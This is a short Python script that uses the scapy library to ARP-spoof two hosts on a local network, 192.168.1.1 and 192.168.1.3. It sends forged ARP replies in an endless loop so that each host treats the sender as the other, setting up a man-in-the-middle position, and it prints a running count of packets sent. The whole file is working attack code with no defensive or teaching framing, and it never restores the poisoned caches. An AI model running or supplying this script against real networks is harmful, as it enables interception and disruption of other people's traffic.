from time import time
import scapy.all as scapy
import time



def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combo = broadcast/arp_req
    ans = scapy.srp(combo, timeout=1 , verbose= False)[0]  #two ans [0] specifies the required answer
    
    return ans[0][1].hwsrc
    


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst= target_ip , hwdst=target_mac , psrc =spoof_ip)
    scapy.send(packet, verbose= False)

sent_count=0
try:
    while True:
        spoof("192.168.1.1","192.168.1.3")
        spoof("192.168.1.3","192.168.1.1")
        sent_count = sent_count + 2
        print("\r [+] packets  sent :" + str(sent_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("[+] C detected")